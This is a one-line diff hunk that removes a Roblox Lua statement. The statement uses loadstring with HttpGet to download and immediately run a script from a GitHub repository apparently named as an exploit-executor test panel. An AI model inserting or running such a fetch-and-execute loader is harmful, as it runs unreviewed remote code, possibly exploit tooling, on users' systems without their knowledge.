@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zryr/executor-test-panel/refs/heads/main/panel.lua"))()
